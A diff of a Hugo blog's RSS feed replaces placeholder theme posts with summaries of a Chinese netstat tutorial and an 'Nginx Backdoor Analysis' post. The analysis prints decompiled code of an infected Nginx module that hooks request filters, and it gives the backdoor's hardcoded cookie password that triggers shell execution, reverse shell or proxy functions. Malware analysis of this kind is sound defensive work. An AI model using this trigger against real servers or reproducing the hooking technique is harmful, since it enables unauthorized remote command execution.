@@ -6,48 +6,35 @@
     <description>Recent content on Call me Sam</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 16 Mar 2018 20:18:53 -0500</lastBuildDate>
+    <lastBuildDate>Tue, 23 Oct 2018 14:35:11 -0500</lastBuildDate>
     
 	<atom:link href="https://cssxn.github.io/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
-      <title>Video post</title>
-      <link>https://cssxn.github.io/posts/video-post/</link>
-      <pubDate>Fri, 16 Mar 2018 20:18:53 -0500</pubDate>
+      <title>Linux上使用netstat查看当前服务和监听端口</title>
+      <link>https://cssxn.github.io/posts/linux-network-port-infomation/</link>
+      <pubDate>Tue, 23 Oct 2018 14:35:11 -0500</pubDate>
       
-      <guid>https://cssxn.github.io/posts/video-post/</guid>
-      <description>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Cursus eget nunc scelerisque viverra. Quam vulputate dignissim suspendisse in est ante in nibh mauris. Pharetra magna ac placerat vestibulum lectus mauris. Eget lorem dolor sed viverra ipsum. Elementum nisi quis eleifend quam adipiscing. Aliquet nec ullamcorper sit amet risus. Auctor neque vitae tempus quam pellentesque. Tincidunt lobortis feugiat vivamus at augue.</description>
+      <guid>https://cssxn.github.io/posts/linux-network-port-infomation/</guid>
+      <description>netstat这个命令常用在网络监控方面。利用这个命令，可以查看当前系统监听的服务和已经建立的服务，以及相应的端口、协议等信息。
+Parameters netstat参数虽然很多，但是常用的不多，主要是下面几个参数：
+netstat -[atunlp]  -a ：all，表示列出所有的连接，服务监听，Socket资料 -t ：tcp，列出tcp协议的服务 -u ：udp，列出udp协议的服务 -n ：port number， 用端口号来显示 -l ：listening，列出当前监听服务 -p ：program，列出服务程序的PID  如果你需要深入了解，可以用man netstat查看netstat命令的详细说明。
+Example 在Terminal终端输入netstat -atunlp命令后，显示结果如下
+root@ubuntu:~# netstat -atunlp Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.1.1:53 0.0.0.0:* LISTEN 1536/dnsmasq tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN 6207/cupsd tcp 1 0 192.168.89.136:49384 91.189.94.25:80 CLOSE_WAIT 7384/ubuntu-geoip-p tcp 0 0 192.</description>
     </item>
     
     <item>
-      <title>Long Form Post</title>
-      <link>https://cssxn.github.io/posts/long-form-post/</link>
-      <pubDate>Thu, 08 Mar 2018 20:18:53 -0500</pubDate>
+      <title>Nginx Backdoor Analysis</title>
+      <link>https://cssxn.github.io/posts/nginx-backdoor-analysis/</link>
+      <pubDate>Fri, 19 Oct 2018 00:00:00 +0000</pubDate>
       
-      <guid>https://cssxn.github.io/posts/long-form-post/</guid>
-      <description>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Cursus eget nunc scelerisque viverra. Quam vulputate dignissim suspendisse in est ante in nibh mauris. Pharetra magna ac placerat vestibulum lectus mauris. Eget lorem dolor sed viverra ipsum. Elementum nisi quis eleifend quam adipiscing. Aliquet nec ullamcorper sit amet risus. Auctor neque vitae tempus quam pellentesque. Tincidunt lobortis feugiat vivamus at augue.</description>
-    </item>
-    
-    <item>
-      <title>Image post</title>
-      <link>https://cssxn.github.io/posts/image-post/</link>
-      <pubDate>Mon, 19 Feb 2018 12:41:46 -0500</pubDate>
-      
-      <guid>https://cssxn.github.io/posts/image-post/</guid>
-      <description>Hello! I&amp;rsquo;m a blog post with an image.</description>
-    </item>
-    
-    <item>
-      <title>Code Poetry</title>
-      <link>https://cssxn.github.io/posts/code-poetry/</link>
-      <pubDate>Tue, 13 Feb 2018 13:56:12 -0500</pubDate>
-      
-      <guid>https://cssxn.github.io/posts/code-poetry/</guid>
-      <description>Pseudo code poem.
-if (this === that): try write_new_poem() except not_a_poet as e: return  Or just one long line&amp;hellip;
-console.log(&amp;#39;Sometimes lines are waaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaay toooooooooooooooooooo looooooooooooooooooooooooooooooong&amp;#39;)  An embedded gist using shortcode:
- </description>
+      <guid>https://cssxn.github.io/posts/nginx-backdoor-analysis/</guid>
+      <description>0) Infected Nginx 使用IDA分析后，发现Nginx被嵌入了一个名为 ngx_http_pwd_init的lua模块
+ngx_int_t __fastcall ngx_http_pwd_init(ngx_conf_t *cf_0) { ngx_http_next_header_filter_11 = ngx_http_top_header_filter; ngx_http_top_header_filter = ngx_http_pwd_header_filter; ngx_http_next_body_filter_10 = ngx_http_top_body_filter; ngx_http_top_body_filter = ngx_http_pwd_body_filter; return 0LL; } 后门主要功能代码在 ngx_http_pwd_header_filter 函数中，该函数可以用来拦截所有的Nginx访问请求头，并对Request中的Cookie信息来验证后门连接密码，以及要执行的功能。
+经分析发现该后门主要有3种功能：
+ 1.Shell Execute 2.Socks5 Proxy 3.Reverse Shell  1) Execute shell command 下面截取了一部分的代码，可以发现，通过匹配Cookie中的worderx字段来验证连接后门的密码，typefp字段作为功能的编号，1号是命令执行，最后调用exec_shell(cmd_fd)来返回一个简单的交互式Shell
+if ( request-&amp;gt;headers_in.cookies.nelts == 1 ) { v5 = *(_BYTE **)(*(_QWORD *)request-&amp;gt;headers_in.cookies.elts + 0x20LL); v6 = *(_BYTE **)(*(_QWORD *)request-&amp;gt;headers_in.cookies.elts + 0x20LL); v7 = &amp;#34;worderx=Bo9vrZ6TKBmq; typefp=1&amp;#34;; // Match the password, and  v8 = 30LL; do { if ( !</description>
     </item>
     
     <item>
@@ -56,44 +43,7 @@ console.log(&amp;#39;Sometimes lines are waaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
       <pubDate>Tue, 13 Feb 2018 13:42:49 -0500</pubDate>
       
       <guid>https://cssxn.github.io/about/</guid>
-      <description>Hello, I&amp;rsquo;m Sam. I&amp;rsquo;m a theme for Hugo. I&amp;rsquo;m an extremely customizable, content-focused theme that lets you showcase your work your way.
-I have slick minimalist templates for list pages (such as a list of blog posts) and single pages (a page to read one blog post). You can use tags on your content, and view content by tags.
-I also have a simple responsive gallery built with CSS grid. It&amp;rsquo;ll look great on any screen, and all you have to do is provide a folder of images.</description>
-    </item>
-    
-    <item>
-      <title>Oh, Alice</title>
-      <link>https://cssxn.github.io/posts/oh-alice/</link>
-      <pubDate>Fri, 09 Feb 2018 12:32:12 -0500</pubDate>
-      
-      <guid>https://cssxn.github.io/posts/oh-alice/</guid>
-      <description>Nor did such soothing scenes, however temporary, fail of at least as temporary an effect on Ahab. But if these secret golden keys did seem to open in him his own secret golden treasuries, yet did his breath upon them prove but tarnishing. Alice opened the door and found that it led into a small passage, not much larger than a rat-hole: she knelt down and looked along the passage into the loveliest garden you ever saw.</description>
-    </item>
-    
-    <item>
-      <title>A Poem</title>
-      <link>https://cssxn.github.io/posts/a-poem/</link>
-      <pubDate>Thu, 01 Feb 2018 12:35:11 -0500</pubDate>
-      
-      <guid>https://cssxn.github.io/posts/a-poem/</guid>
-      <description>Now pleasing sleep had seal&amp;rsquo;d each mortal eye,
-Stretch&amp;rsquo;d in the tents the Grecian leaders lie:
-The immortals slumber&amp;rsquo;d on their thrones above;
-All, but the ever-wakeful eyes of Jove.(76)
-To honour Thetis&amp;rsquo; son he bends his care,
-And plunge the Greeks in all the woes of war:
-Then bids an empty phantom rise to sight,
-And thus commands the vision of the night.
-&amp;ldquo;Fly hence, deluding Dream! and light as air,(77)</description>
-    </item>
-    
-    <item>
-      <title>A Test</title>
-      <link>https://cssxn.github.io/posts/test/</link>
-      <pubDate>Thu, 01 Feb 2018 12:35:11 -0500</pubDate>
-      
-      <guid>https://cssxn.github.io/posts/test/</guid>
-      <description> test </description>
+      <description>We’re Good People But Why Don’t We Show It?</description>
     </item>
     
   </channel>
